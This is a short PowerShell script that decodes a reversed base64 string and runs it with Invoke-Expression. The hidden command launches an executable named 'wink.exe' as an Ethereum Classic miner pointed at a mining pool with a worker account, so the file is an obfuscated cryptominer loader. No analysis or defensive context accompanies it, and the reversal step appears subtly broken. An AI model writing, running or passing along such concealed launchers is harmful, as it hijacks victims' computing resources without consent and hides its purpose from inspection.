$best64code = "=QDMw4Cdhh3byVGWgIXZzVXLtACMwgTM602bj5SZj5WYulmYs92bw5yY0VGIyVmdyV2ct0CIoNXYoNGdlBSYtASZ4VmLr5Wa3xlL"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
Invoke-Expression $LoadCode
